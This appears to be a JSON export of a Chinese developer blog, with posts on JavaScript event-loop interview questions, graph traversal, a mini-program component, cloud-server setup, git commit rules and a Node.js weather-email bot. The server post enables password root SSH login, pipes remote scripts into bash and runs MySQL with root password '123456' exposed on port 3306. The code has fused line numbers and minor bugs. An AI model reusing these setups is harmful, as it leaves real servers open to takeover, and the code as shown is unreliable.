console.log(\"async1 start\"); await async2(); console.log(\"async1 end\");} 等价于 123456async function async1() { console.log(\"async1 start\"); Promise.resolve(async2()).then(() => { console.log(\"async1 end\"); });} 回到本题以上就本道题涉及到的所有相关知识点了，下面我们再回到这道题来一步一步看看怎么回事儿。 首先，事件循环从宏任务(macrotask)队列开始，这个时候，宏任务队列中，只有一个 script(整体代码)任务；当遇到任务源(task source)时，则会先分发任务到对应的任务队列中去。所以，上面例子的第一步执行如下图所示： 然后我们看到首先定义了两个 async 函数，接着往下看，然后遇到了 console 语句，直接输出 script start。输出之后，script 任务继续往下执行，遇到 setTimeout，其作为一个宏任务源，则会先将其任务分发到对应的队列中： script 任务继续往下执行，执行了 async1()函数，前面讲过 async 函数中在 await 之前的代码是立即执行的，所以会立即输出async1 start。遇到了 await 时，会将 await 后面的表达式执行一遍，所以就紧接着输出async2，然后将 await 后面的代码也就是console.log('async1 end')加入到 microtask 中的 Promise 队列中，接着跳出 async1 函数来执行后面的代码。 script 任务继续往下执行，遇到 Promise 实例。由于 Promise 中的函数是立即执行的，而后续的 .then 则会被分发到 microtask 的 Promise 队列中去。所以会先输出 promise1，然后执行 resolve，将 promise2 分配到对应队列。 script 任务继续往下执行，最后只有一句输出了 script end，至此，全局任务就执行完毕了。根据上述，每次执行完一个宏任务之后，会去检查是否存在 Microtasks；如果有，则执行 Microtasks 直至清空 Microtask Queue。因而在 script 任务执行完毕之后，开始查找清空微任务队列。此时，微任务中， Promise 队列有的两个任务async1 end和promise2，因此按先后顺序输出 async1 end，promise2。当所有的 Microtasks 执行完毕之后，表示第一轮的循环就结束了。 第二轮循环开始，这个时候就会跳回 async1 函数中执行后面的代码，然后遇到了同步任务 console 语句，直接输出 async1 end。这样第二轮的循环就结束了。（也可以理解为被加入到 script 任务队列中，所以会先与 setTimeout 队列执行） 第二轮循环依旧从宏任务队列开始。此时宏任务中只有一个 setTimeout，取出直接输出即可，至此整个流程结束。 下面我会改变一下代码来加深印象。 变式一在第一个变式中我将 async2 中的函数也变成了 Promise 函数，代码如下： 1234567891011121314151617181920212223242526272829async function async1() { console.log(\"async1 start\"); await async2(); console.log(\"async1 end\");}async function async2() { //async2做出如下更改： new Promise(function(resolve) { console.log(\"promise1\"); resolve(); }).then(function() { console.log(\"promise2\"); });}console.log(\"script start\");setTimeout(function() { console.log(\"setTimeout\");}, 0);async1();new Promise(function(resolve) { console.log(\"promise3\"); resolve();}).then(function() { console.log(\"promise4\");});console.log(\"script end\"); 可以先自己看看输出顺序会是什么，下面来公布结果： 123456789script startasync1 startpromise1promise3script endpromise2async1 endpromise4setTimeout 在第一次 macrotask 执行完之后，也就是输出script end之后，会去清理所有 microtask。所以会相继输出promise2，async1 end ，promise4，其余不再多说。 变式二在第二个变式中，我将 async1 中 await 后面的代码和 async2 的代码都改为异步的，代码如下： 12345678910111213141516171819202122232425262728async function async1() { console.log(\"async1 start\"); await async2(); //更改如下： setTimeout(function() { console.log(\"setTimeout1\"); }, 0);}async function async2() { //更改如下： setTimeout(function() { console.log(\"setTimeout2\"); }, 0);}console.log(\"script start\");setTimeout(function() { console.log(\"setTimeout3\");}, 0);async1();new Promise(function(resolve) { console.log(\"promise1\"); resolve();}).then(function() { console.log(\"promise2\");});console.log(\"script end\"); 可以先自己看看输出顺序会是什么，下面来公布结果： 12345678script startasync1 startpromise1script endpromise2setTimeout3setTimeout2setTimeout1 在输出为promise2之后，接下来会按照加入 setTimeout 队列的顺序来依次输出，通过代码我们可以看到加入顺序为3 2 1，所以会按 3，2，1 的顺序来输出。 变式三变式三是我在一篇面经中看到的原题，整体来说大同小异，代码如下： 123456789101112131415161718192021222324252627282930313233async function a1() { console.log(\"a1 start\"); await a2(); console.log(\"a1 end\");}async function a2() { console.log(\"a2\");}console.log(\"script start\");setTimeout(() => { console.log(\"setTimeout\");}, 0);Promise.resolve().then(() => { console.log(\"promise1\");});a1();let promise2 = new Promise(resolve => { resolve(\"promise2.then\"); console.log(\"promise2\");});promise2.then(res => { console.log(res); Promise.resolve().then(() => { console.log(\"promise3\"); });});console.log(\"script end\"); 无非是在微任务那块儿做点文章，前面的内容如果你都看懂了的话这道题一定没问题的，结果如下： 12345678910script starta1 starta2promise2script endpromise1a1 endpromise2.thenpromise3setTimeout 最后 原文:https://github.com/Advanced-Frontend/Daily-Interview-Question/issues/7","link":"/posts/e8e1d874/"},{"title":"大厂前端高频面试问题与答案","text":"近日，我在掘金看到 GitHub 上一位名为木易杨（yygmind）的开发者，建了一个名为 Advanced-Frontend/Daily-Interview-Question 的项目，该项目每天会更新一道大厂前端面试题，并邀请开发者在 issue 区中作答，我将从中选出一些试题及答案，如有问题，欢迎大家在原作者的 GitHub issue 上提出建议。 写 React/Vue 项目时为什么要在组件中写 key，其作用是什么？ key 的作用是为了在 diff 算法执行时更快的找到对应的节点，提高 diff 速度。 vue 和 react 都是采用 diff 算法来对比新旧虚拟节点，从而更新节点。在 vue 的 diff 函数中。可以先了解一下 diff 算法。在交叉对比的时候，当新节点跟旧节点头尾交叉对比没有结果的时候，会根据新节点的 key 去对比旧节点数组中的 key，从而找到相应旧节点（这里对应的是一个 key => index 的 map 映射）。如果没找到就认为是一个新增节点。而如果没有 key，那么就会采用一种遍历查找的方式去找到对应的旧节点。一种一个 map 映射，另一种是遍历查找。相比而言。map 映射的速度更快。 vue 部分源码如下： 1234567// vue项目 src/core/vdom/patch.js -488行// oldCh 是一个旧虚拟节点数组，if (isUndef(oldKeyToIdx)) oldKeyToIdx = createKeyToOldIdx(oldCh, oldStartIdx, oldEndIdx);idxInOld = isDef(newStartVnode.key) ? oldKeyToIdx[newStartVnode.key] : findIdxInOld(newStartVnode, oldCh, oldStartIdx, oldEndIdx); 创建 map 函数 123456789function createKeyToOldIdx(children, beginIdx, endIdx) { let i, key; const map = {}; for (i = beginIdx; i 2 测试成功 图的遍历两种遍历算法： 深度优先遍历 广度优先遍历 深度优先遍历（DFS）深度优先遍历（Depth-First-Search），是搜索算法的一种，它沿着树的深度遍历树的节点，尽可能深地搜索树的分支。当节点 v 的所有边都已被探寻过，将回溯到发现节点 v 的那条边的起始节点。这一过程一直进行到已探寻源节点到其他所有节点为止，如果还有未被发现的节点，则选择其中一个未被发现的节点为源节点并重复以上操作，直到所有节点都被探寻完成。 简单的说，DFS 就是从图中的一个节点开始追溯，直到最后一个节点，然后回溯，继续追溯下一条路径，直到到达所有的节点，如此往复，直到没有路径为止。 DFS 可以产生相应图的拓扑排序表，利用拓扑排序表可以解决很多问题，例如最大路径问题。一般用堆数据结构来辅助实现 DFS 算法。 注意：深度 DFS 属于盲目搜索，无法保证搜索到的路径为最短路径，也不是在搜索特定的路径，而是通过搜索来查看图中有哪些路径可以选择。 步骤： 访问顶点 v 依次从 v 的未被访问的邻接点出发，对图进行深度优先遍历；直至图中和 v 有路径相通的顶点都被访问 若此时途中尚有顶点未被访问，则从一个未被访问的顶点出发，重新进行深度优先遍历，直到所有顶点均被访问过为止 实现： 123456789101112131415161718192021Graph.prototype.dfs = function() { var marked = []; for (var i = 0; i < this.vertices.length; i++) { if (!marked[this.vertices[i]]) { dfsVisit(this.vertices[i]); } } function dfsVisit(u) { let edges = this.edges; marked[u] = true; console.log(u); var neighbors = edges.get(u); for (var i = 0; i < neighbors.length; i++) { var w = neighbors[i]; if (!marked[w]) { dfsVisit(w); } } }}; 测试： 123456graph.dfs();// 1// 4// 3// 2// 5 测试成功 广度优先遍历（BFS）广度优先遍历（Breadth-First-Search）是从根节点开始，沿着图的宽度遍历节点，如果所有节点均被访问过，则算法终止，BFS 同样属于盲目搜索，一般用队列数据结构来辅助实现 BFS BFS 从一个节点开始，尝试访问尽可能靠近它的目标节点。本质上这种遍历在图上是逐层移动的，首先检查最靠近第一个节点的层，再逐渐向下移动到离起始节点最远的层 步骤： 创建一个队列，并将开始节点放入队列中 若队列非空，则从队列中取出第一个节点，并检测它是否为目标节点 若是目标节点，则结束搜寻，并返回结果 若不是，则将它所有没有被检测过的字节点都加入队列中 若队列为空，表示图中并没有目标节点，则结束遍历 实现： 1234567891011121314151617181920Graph.prototype.bfs = function(v) { var queue = [], marked = []; marked[v] = true; queue.push(v); // 添加到队尾 while (queue.length > 0) { var s = queue.shift(); // 从队首移除 if (this.edges.has(s)) { console.log(\"visited vertex: \", s); } let neighbors = this.edges.get(s); for (let i = 0; i < neighbors.length; i++) { var w = neighbors[i]; if (!marked[w]) { marked[w] = true; queue.push(w); } } }}; 测试： 123456graph.bfs(1);// visited vertex: 1// visited vertex: 4// visited vertex: 3// visited vertex: 2// visited vertex: 5 测试成功 答案链接 异步笔试题请写出下面代码的运行结果 1234567891011121314151617181920async function async1() { console.log(\"async1 start\"); await async2(); console.log(\"async1 end\");}async function async2() { console.log(\"async2\");}console.log(\"script start\");setTimeout(function() { console.log(\"setTimeout\");}, 0);async1();new Promise(function(resolve) { console.log(\"promise1\"); resolve();}).then(function() { console.log(\"promise2\");});console.log(\"script end\"); 答案： 12345678script startasync1 startasync2promise1script endasync1 endpromise2setTimeout 这道题主要考察的是事件循环中函数执行顺序的问题，其中包括async ，await，setTimeout，Promise函数。下面来说一下本题中涉及到的知识点。 算法手写题已知如下数组： 1var arr = [[1, 2, 2], [3, 4, 5, 5], [6, 7, 8, 9, [11, 12, [12, 13, [14]]]], 10]; 编写一个程序将数组扁平化去并除其中重复部分数据，最终得到一个升序且不重复的数组 总结JS 异步已经告一段落了，这里来一波小总结 1. 回调函数（callback）123setTimeout(() => { // callback 函数体}, 1000); 缺点：回调地狱，不能用 try catch 捕获错误，不能 return 回调地狱的根本问题在于： 缺乏顺序性： 回调地狱导致的调试困难，和大脑的思维方式不符 嵌套函数存在耦合性，一旦有所改动，就会牵一发而动全身，即（控制反转） 嵌套函数过多的多话，很难处理错误 123456789ajax(\"XXX1\", () => { // callback 函数体 ajax(\"XXX2\", () => { // callback 函数体 ajax(\"XXX3\", () => { // callback 函数体 }); });}); 优点：解决了同步的问题（只要有一个任务耗时很长，后面的任务都必须排队等着，会拖延整个程序的执行。） 2. PromisePromise 就是为了解决 callback 的问题而产生的。 Promise 实现了链式调用，也就是说每次 then 后返回的都是一个全新 Promise，如果我们在 then 中 return ，return 的结果会被 Promise.resolve() 包装 优点：解决了回调地狱的问题 123456789101112ajax(\"XXX1\") .then(res => { // 操作逻辑 return ajax(\"XXX2\"); }) .then(res => { // 操作逻辑 return ajax(\"XXX3\"); }) .then(res => { // 操作逻辑 }); 缺点：无法取消 Promise ，错误需要通过回调函数来捕获 3. Generator特点：可以控制函数的执行，可以配合 co 函数库使用 123456789function* fetch() { yield ajax(\"XXX1\", () => {}); yield ajax(\"XXX2\", () => {}); yield ajax(\"XXX3\", () => {});}let it = fetch();let result1 = it.next();let result2 = it.next();let result3 = it.next(); 4. Async/awaitasync、await 是异步的终极解决方案 优点是：代码清晰，不用像 Promise 写一大堆 then 链，处理了回调地狱的问题 缺点：await 将异步代码改造成同步代码，如果多个异步操作没有依赖性而使用 await 会导致性能上的降低。 1234567async function test() { // 以下代码没有依赖性的话，完全可以使用 Promise.all 的方式 // 如果有依赖性的话，其实就是解决回调地狱的例子了 await fetch(\"XXX1\"); await fetch(\"XXX2\"); await fetch(\"XXX3\");} 下面来看一个使用 await 的例子： 12345678let a = 0let b = async () => { a = a + await 10 console.log('2', a) // -> '2' 10}b()a++console.log('1', a) // -> '1' 1 对于以上代码你可能会有疑惑，让我来解释下原因 首先函数 b 先执行，在执行到 await 10 之前变量 a 还是 0，因为 await 内部实现了 generator ，**generator 会保留堆栈中东西，所以这时候 a = 0 被保存了下来** 因为 await 是异步操作，后来的表达式不返回 Promise 的话，就会包装成 Promise.reslove(返回值)，然后会去执行函数外的同步代码 同步代码执行完毕后开始执行异步代码，将保存下来的值拿出来使用，这时候 a = 0 + 10 上述解释中提到了 await 内部实现了 generator，其实 await 就是 generator 加上 Promise的语法糖，且内部实现了自动执行 generator。如果你熟悉 co 的话，其实自己就可以实现这样的语法糖。 来自 ：https://github.com/LuNaHaiJiao/blog/issues/29 最后 待更新……","link":"/posts/d55a1324/"},{"title":"小程序全局组件的使用","text":"开发小程序时经常会用到全局组件，不限制页面随时可用的组件，但小程序的全局组件非常鸡肋，小程序并不能动态渲染，需要每个页面都需要引入，虽然可以全局声明 （开发者工具 1.02.1810190 支持），但是像全局提醒组件还是需要每个页面写组件，但是可以把组件方法提到全局 也是很好了 ，接下来开始小程序全局组件的使用吧! 编写全局提示组件index.wxml123 {{ item.content }} index.wxss12345678910111213.notice-container { position: fixed; top: 0; min-height: 30px; line-height: 30px; width: 100%; background: rgba(0, 0, 0, 0.25); color: #fff; display: none;}.notice-container .notice-show { display: block;} index.js12345678910111213141516171819202122232425262728293031323334353637const default_data = { visible: false, content: \"\"};let timmer = null;Component({ data: { ...default_data }, methods: { handleShow(options) { this.setData({ ...options, visible: true }); const d = 2 * 1000; if (timmer) clearTimeout(timmer); if (d !== 0) { timmer = setTimeout(() => { this.handleHide(); timmer = null; }, d); } }, handleHide() { this.setData({ ...default_data }); } }}); index.json123{ \"component\": true} 全局声明在app.json配置中添加如下配置 12345{ \"usingComponents\": { \"notice\": \"./components/notice/index\" }} 页面引入 这就麻烦了 需要的页面都需要引入只是不需要声明了 页面引入如下 1 这里的id 值很重要后面要用到 全局调用 接下来很重要新建notice.js 1234567891011121314151617181920function getCtx(selector) { const pages = getCurrentPages(); const ctx = pages[pages.length - 1]; const componentCtx = ctx.selectComponent(selector); if (!componentCtx) { console.error(\"无法找到对应的组件\"); return null; } return componentCtx;}function Notice(options) { const { selector = \"#notice\" } = options; // notice 为刚才的id值 const ctx = getCtx(selector); ctx.handleShow(options);}const $notice = Notice;export default $notice; 每个页面全局调用这个 $notice 方法就可以了 最后反正小程序的全局组件还是很难用，如果能 js 动态渲染就好了 期待吧。。。","link":"/posts/2b067fbc/"},{"title":"腾讯Ubuntu云服务器环境初始配置","text":"一、配置 root 登陆 腾讯 Ubuntu 云服务器默认用户ubuntu ，又懒得 每次都输 sudo ，所以加上 root 用户 1. 设置 root 密码先使用 ubuntu 用户 ssh 登录腾讯云，然后执行命令 1sudo passwd root 2. 修改 ssh 登录的配置/etc/ssh/sshd_config文件，修改为允许 root 登录，可以执行命令 1sudo vim /etc/ssh/sshd_config 注意：这里的 sudo 前缀不可少，否则接下来的修改无法保存。进入 vim 编辑，用方向键向下滚动找到 PermitRootLogin 这项按下 insert 键进入插入模式，将 PermitRootLogin 后面的 prohibit-password 改为 yes，再按下 Esc 键，然后依次按下:键(英文冒号键)、w 键和 q 键，最后按下回车键，保存修改成功。 3. 重启 ssh 服务1sudo service ssh restart 使刚才的 ssh 配置的修改生效，执行命令 使用 root 用户登录使用root用户登录 必要的话 可以删除ubuntu 用户 删除命令： 1userdel -r ubuntu 二、安装 docker 及 docker-composedocker最方便的方法是使用官方脚本并使用阿里云镜像安装 1curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun 如果您想将 Docker 用作非 root 用户，您现在应该考虑将您的用户添加到“docker”组，例如：可以自行添加用户 （尽量避免使用docker作为用户名） 1useradd your-user 1sudo usermod -aG docker your-user 请记得注销并重新登录才能生效！ docker-compose1. 运行脚本1sudo curl -L \"https://github.com/docker/compose/releases/download/1.24.0/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose 其中 1.24.0 可以切换你想安装的版本 2. 对二进制文件应用可执行权限：1sudo chmod +x /usr/local/bin/docker-compose 注意：如果 docker-compose 安装后命令失败，请检查您的路径。您还可以创建/usr/bin 路径中的符号链接或任何其他目录。 例如： 1sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose 3. 测试安装。1docker-compose --version 4. 卸载:1sudo rm /usr/local/bin/docker-compose 三、安装 Nginx因为是ubuntu 系统 不像 centos ,ubuntu 的包都比较新 所以直接用包管理器安装 12apt-get updateapt-get install nginx 完成之后 nginx -v 打印出版本号就说明安装成功了 四、安装 Node.js因为每个项目可能依赖的 Node 版本不同 这里选用了 nvm 来作为 node 的包管理器 ，它可以方便的在同一台设备上进行多个 node 版本之间切换 1curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.34.0/install.sh | bash 注意：在 Linux 上，运行安装脚本后，如果 nvm: command not found 在键入后收到或看不到终端的反馈： 1command -v nvm 只需关闭当前终端，打开新终端，然后再次尝试 nvm -v验证。 验证成功后就可以安装node.js了 nvm 用法要下载，编译和安装最新版本的节点，请执行以下操作： 1nvm install node # node是最新版本的别名 要安装特定版本的节点： 1nvm install 6.14.4 # 10.10.0,8.9.1 等 您可以使用 ls-remote 列出可用版本： 1nvm ls-remote 然后在任何新的 shell 中只使用已安装的版本： 五、安装 MongoDB既然我们安装了 docker 我们就用 docker 安装 MongoDB 1. 拉取镜像1docker pull mongo # 直接拉去默认tag 为latest 的mongo:latest 镜像 2. 使用 mongo 镜像1docker run --name mongo -p 27017:27017 -v /mongo/db:/data/db -d mongo 命令说明： –name 命名容器名字 -p 27017:27017 :将容器的 27017 端口映射到主机的 27017 端口 -v /mongo/db:/data/db :将主机中/mongo/db 挂载到容器的/data/db，作为 mongo 数据存储目录 3. 查看容器启动情况1docker ps 可看到 已经运行成功了 使用 mongo 镜像执行 mongo 命令连接到刚启动的容器 1docker run -it mongo:latest mongo 六、安装 MongoDB跟安装 MongoDB 一样 12345678docker pull mysql:5.6mkdir -p /mysql/data /mysql/logs /mysql/confdocker run -p 3306:3306 --name mymysql \\ -v /mysql/conf:/etc/mysql/conf.d \\ -v /mysql/logs:/logs \\ -v /mysql/data:/var/lib/mysql \\ -e MYSQL_ROOT_PASSWORD=123456 \\ -d mysql:5.6 命令说明： -p 3306:3306 #将容器的 3306 端口映射到主机的 3306 端口。 -v /mysql/conf:/etc/mysql/conf.d #将主机当前目录下的 conf/my.cnf 挂载到容器的 /etc/mysql/my.cnf。 -v /mysql/logs:/logs #将主机当前目录下的 logs 目录挂载到容器的 /logs。 -v /mysql/data:/var/lib/mysql #将主机当前目录下的 data 目录挂载到容器的 /var/lib/mysql 。 -e MYSQL_ROOT_PASSWORD=123456 #初始化 root 用户的密码。 查看容器启动情况 1docker ps ** 注意 ： mysql 5.7 及以上版本 映射的配置文件目录可能有所不同 详细可取 Docker Hub 查看** 使用 docker-compose这个以后另开文章详细讲","link":"/posts/aa43c23f/"},{"title":"git命令的代码统计方法","text":"最近需要统计每个人的 git 代码提交，搜了一下才发现这个以作记录! 1.统计所有人代码量 统计所有人代码增删量，拷贝如下命令，直接在 git bash 等终端，git 项目某分支下执行 1git log --format='%aN' | sort -u | while read name; do echo -en \"$name\\t\"; git log --author=\"$name\" --pretty=tformat: --numstat | awk '{ add += $1; subs += $2; loc += $1 - $2 } END { printf \"added lines: %s, removed lines: %s, total lines: %s\\n\", add, subs, loc }' -; done 2.统计指定提交者代码量 统计单个提交者代码量，将下面的–author=”username” 中的 username 替换成具体的提交者，然后执行 1git log --author=\"username\" --pretty=tformat: --numstat | awk '{ add += $1; subs += $2; loc += $1 - $2 } END { printf \"added lines: %s, removed lines: %s, total lines: %s\\n\", add, subs, loc }' -","link":"/posts/4f63b216/"},{"title":"DockerHub国内镜像设置加速服务","text":"哪些 docker hub 镜像加速目前有许多镜像地址 https://docker.mirrors.ustc.edu.cn/ （中国科学技术大学（LUG@USTC）的开源镜像） https://registry.docker-cn.com （docker 官方中国镜像） 阿里云的容器镜像服务里也有专属加速器地址 可进 https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors 查看，大致是 https://xxxxxxxx.mirror.aliyuncs.com 我用的当中 属 中国科学技术大学（LUG@USTC）的开源镜像最快 配置镜像加速Linux 新版的 Docker 使用镜像配置地址是 /etc/docker/daemon.json 但可能文件不存在 12345678sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json","link":"/posts/ce680882/"},{"title":"git commit 规范以及规范校验","text":"前言在多人协作项目中，如果代码风格不统一、代码提交信息的说明不准确，那么在后期协作以及 Bug 处理时会非常艰难。因此 git commit 提交规范极其重要。本文主要介绍 git commit 提交规范，以及用工具在 git commit 代码之前检测 commit messages 是否符合规范. Angular 的 commit 规范1(): type用于说明 commit 的类别，只允许使用下面 7 个标识。 feat: 新功能（feature） fix: 修补 bug docs: 文档（documentation） style: 格式（不影响代码运行的变动） refactor: 重构（即不是新增功能，也不是修改 bug 的代码变动） test: 增加测试 build: 改变了build工具 revert: 还原 perf: 性能优化 ci: 持续集成 Scope(选填)用来说明本次 Commit 影响的范围，即简要说明修改会涉及的部分。这个是选填项，但还是建议填 Subject用来简要描述本次改动和概述。 通常以动词开头，使用第一人称现在时，比如 change，而不是 changed 或 changes 首字母不要大写 结尾不用句号(.) 工具校验 commit 是否符合规范我们可以用 husky 工具校验，他是个git hook可以防止坏git commit，git push 规范格式这边采用 Angular Commit message的格式 安装工具及配置1npm install husky --save-dev 12npm install --save-dev @commitlint/config-conventional @commitlint/cli 配置文件在文件根目录新建配置文件commitlint.config.js 12// commitlint.config.jsmodule.exports = { extends: [\"@commitlint/config-conventional\"] }; //采用angular 格式 git hook要在创建之前提交提交，您可以使用 Husky 的’commit-msg’钩子： 12345678// package.json{ \"husky\": { \"hooks\": { \"commit-msg\": \"commitlint -E HUSKY_GIT_PARAMS\" } }} 提交检测之后提交都会验证规则 不符合则会拦截 生成 changelog 文件如果你的所有 Commit 都符合 Angular 格式，那么发布新版本时， Change log 就可以用脚本自动生成。生成的文档包括以下三个部分： New features Bug fixes Breaking changes. 每个部分都会罗列相关的 commit ，并且有指向这些 commit 的链接。当然，生成的文档允许手动修改，所以发布前，你还可以添加其他内容。 1npm install conventional-changelog-cli --save-dev 1234// package.json\"scripts\": { \"changelog\": \"conventional-changelog -p angular -i CHANGELOG.md -s -r 0\" } 运行 npm run changelog 则可自动生成 CHANGELOG.md","link":"/posts/473e906/"},{"title":"二维码api接口","text":"自己搭了一个在线二维码生成接口 二维码接口地址1https://api.chenyeah.com/qr? API 参数说明 text : 二维码内容 size : 二维码大小 ( Number 单位 px, 默认 240 ,范围 100~1000) 示例： 浏览器打开https://api.chenyeah.com/qr?text=https://yoaio.com 即可看到二维码 TODO 添加美化","link":"/posts/2d537b50/"},{"title":"Nodejs 爬取one和墨迹天气定时发邮件","text":"根据用户配置 爬取 one 和不同地区墨迹天气 每天定时发邮件，支持多人地区个性化定制 可以的话 可以去https://github.com/cyea/email-bot 给个小星星 效果展示 如何快速使用1. 拉取代码安装依赖这里使用yarn作为包管理器 123git clone https://github.com/cyea/email-bot.gitcd email-botyarn 2. 配置① 修改发送者邮箱账号密码敏感配置新建.env文件 格式是跟.env.example 一样的 填入自己的邮箱账号密码及邮件提供商 1234NODE_ENV = production #正式环境精简代码所用EmianService = outlook #邮件提供商 支持列表：https://nodemailer.com/smtp/well-known/EamilAuth_user = xxxx@outlook.com #发送者邮箱地址EamilAuth_pass = xxxxxxxxx # smtp 授权码 ② 修改其他不敏感配置修改config/index.js里的配置文件 123456789101112131415161718192021222324252627282930const { env } = process;module.exports = { ONE: \"http://wufazhuce.com/\", // ONE的web版网站 MOJI_HOST: \"https://tianqi.moji.com/weather/china/\", // 中国墨迹天气url, EmianService: env.EmianService, // 发送者邮箱厂家 EamilAuth: { // 发送者邮箱账户用户名及密码 user: env.EamilAuth_user, pass: env.EamilAuth_pass }, EmailFrom: \"yuyehack@outlook.com\", // 发送者昵称与邮箱地址 EmailSubject: \"一封暖暖的小邮件\", // 邮件主题 /** * @description: 收信人详细 */ EmailToArr: [ { TO: \"yuyehack@gmail.com\", // 接收者邮箱地址 CITY: \"jiangsu\", // 墨迹天气链接末尾城市代码 LOCATION: \"pukou-district\" // 墨迹天气链接末尾详细地区代码 }, { TO: \"yuyehack@qq.com\", CITY: \"jiangsu\", LOCATION: \"kunshan\" } ], //每日发送时间 SENDDATE: \"58 15 8 * * *\"}; ③ 运行1yarn start 代码详解 具体代码可见 https://github.com/cyea/email-bot.git 先展示下项目结构 12345678910111213141516171819202122232425├─config│ index.js #配置│├─email│ index.js #发送邮件模块│├─superagent│ index.js #获取天气及ONE 数据│├─utils│ index.js #通用工具函数│ superagent.js #请求发送封装│├─view| index.js #生成邮件样式模块| index.njk #邮件样式模板模块│ .env.example #.env│ index.js #服务启动模块│ schedule.js #定时模块│ test.js #模板样式调试模块│ yarn.lock│ .gitignore│ LICENSE│ package.json│ README.md 1. 爬取数据使用 superagent 和 cheerio 组合来实现爬虫 ① superagent 使用因为多次两次使用的superagent 函数代码结构类似 所以我再把 superagent 封装了一次 Promise 抛出 fetch方法 123456789101112131415161718// utils/superagent.jsconst superagent = require(\"superagent\");//请求function fetch(url, method, params, data, cookies) { return new Promise(function(resolve, reject) { superagent(method, url) .query(params) .send(data) .set(\"Content-Type\", \"application/x-www-form-urlencoded\") .end(function(err, response) { if (err) { reject(err); } resolve(response); }); });}module.exports = fetch; ② 数据爬取 爬取 ONE 12345678910111213141516171819202122const getOne = async () => { // 获取每日一句 let res = await fetch(config.ONE, \"GET\"); let $ = cheerio.load(res.text); //转化成类似jquery结构 let todayOneList = $(\"#carousel-one .carousel-inner .item\"); // 通过查看DOM获取今日句子 let info = $(todayOneList[0]) .find(\".fp-one-cita\") .text() .replace(/(^\\s*)|(\\s*$)/g, \"\"); let imgSrc = $(todayOneList[0]) .find(\".fp-one-imagen\") .attr(\"src\"); return { // 抛出 one 对象 one: { info, imgSrc } };}; 爬取天气 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970const getWeather = async (city, location) => { //获取墨迹天气 let url = config.MOJI_HOST + city + \"/\" + location; // 根据配置得到天气url let res = await fetch(url, \"GET\"); let $ = cheerio.load(res.text); //获取墨迹天气地址 let addressText = $(\".search_default\") .text() .trim() .split(\"， \") .reverse() .join(\"-\"); //获取墨迹天气提示 let weatherTip = $(\".wea_tips em\").text(); // 获取现在的天气数据 const now = $(\".wea_weather.clearfix\"); let nowInfo = { Temp: now.find(\"em\").text(), WeatherText: now.find(\"b\").text(), FreshText: now.find(\".info_uptime\").text() }; // 循环获取未来三天数据 let threeDaysData = []; $(\".forecast .days\").each(function(i, elem) { // 循环获取未来几天天气数据 const SingleDay = $(elem).find(\"li\"); threeDaysData.push({ Day: $(SingleDay[0]) .text() .replace(/(^\\s*)|(\\s*$)/g, \"\"), WeatherImgUrl: $(SingleDay[1]) .find(\"img\") .attr(\"src\"), WeatherText: $(SingleDay[1]) .text() .replace(/(^\\s*)|(\\s*$)/g, \"\"), Temperature: $(SingleDay[2]) .text() .replace(/(^\\s*)|(\\s*$)/g, \"\"), WindDirection: $(SingleDay[3]) .find(\"em\") .text() .replace(/(^\\s*)|(\\s*$)/g, \"\"), WindLevel: $(SingleDay[3]) .find(\"b\") .text() .replace(/(^\\s*)|(\\s*$)/g, \"\"), Pollution: $(SingleDay[4]) .text() .replace(/(^\\s*)|(\\s*$)/g, \"\"), PollutionLevel: $(SingleDay[4]) .find(\"strong\") .attr(\"class\") }); }); return { moji: { addressText, weatherTip, nowInfo, threeDaysData } };}; ③ 数据合并异步获取两个数据 1234567const getAllData = async (city, location) => { let oneData = await getOne(); let weatherData = await getWeather(city, location); const allData = { today: formatDate(), ...oneData, ...weatherData }; return allData;};module.exports = getAllData; 2. 模版引擎生成 HTML① 模板编写ejs 这种模板已经年老 更新不及时，所以换了更清晰更新的 nunjucks 因为邮件不支持外链 css 所以使用内联 css 虽然比较麻烦 使用刚获取到数据 模板渲染 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566 今天是{{today}} {{moji.nowInfo.Temp}}℃ {{moji.nowInfo.WeatherText}} {{moji.addressText}} {{moji.weatherTip}} 近期天气预报 {% for item in moji.threeDaysData %} {{ item.Day }} {{ item.WeatherText }} {{ item.Temperature }} {% if (item.PollutionLevel==='level_1') %} {{ item.Pollution }} {% elif (item.PollutionLevel==='level_2') %} {{ item.Pollution }} {% elif (item.PollutionLevel==='level_3') %} {{ item.Pollution }} {% elif (item.PollutionLevel==='level_4') %} {{ item.Pollution }} {% elif (item.PollutionLevel==='level_5') %} {{ item.Pollution }} {% elif (item.PollutionLevel==='level_6') %} {{ item.Pollution }} {% else %} none {% endif %} {% endfor %} ONE · 一个 摄影 {{one.info}} ② 模板渲染node fs 模块 读取本地模板文件 抛出 渲染好的 html 结构数据 12345678910111213141516171819const nunjucks = require(\"nunjucks\");const fs = require(\"fs\");const path = require(\"path\");const getHtmlData = njkData => { return new Promise((resolve, reject) => { try { const njkString = fs.readFileSync( path.resolve(__dirname, \"index.njk\"), \"utf8\" ); const htmlData = nunjucks.renderString(njkString, njkData); resolve(htmlData); } catch (error) { reject(error); } });};module.exports = getHtmlData; 3. 使用 Node 发送邮件这里使用 nodemailer 注意的是邮箱密码不是你登录邮箱的密码，而是 smtp 授权码，什么是 smtp 授权码呢？就是你的邮箱账号可以使用这个 smtp 授权码在别的地方发邮件，一般 smtp 授权码在邮箱官网的设置中可以看的到.不知道的话可以使用邮箱账号及密码试试 12345678910111213141516171819202122const config = require(\"./../config\");const sendMail = (transporter, To, HtmlData) => { return new Promise((resolve, reject) => { let mailOptions = { from: config.EmailFrom, // 发送者邮箱 to: To, // 接收邮箱 subject: config.EmailSubject, // // 邮件主题 html: HtmlData //模板数据 }; transporter.sendMail(mailOptions, (error, info = {}) => { if (error) { console.error(\"邮件发送成功\" + error); reject(error); } else { console.log(\"邮件发送成功\", info.messageId); console.log(\"静等下一次发送\"); resolve(); } }); });};module.exports = sendMail; 4. 整合运行1234567891011121314151617181920let transporter = nodemailer.createTransport({ service: EmianService, port: 465, secureConnection: true, auth: EamilAuth, pool: true});const getAllDataAndSendMail = async () => { for (let i = 0, len = EmailToArr.length; i < len; i++) { try { let item = EmailToArr[i]; let apiData = await getAllData(item.CITY, 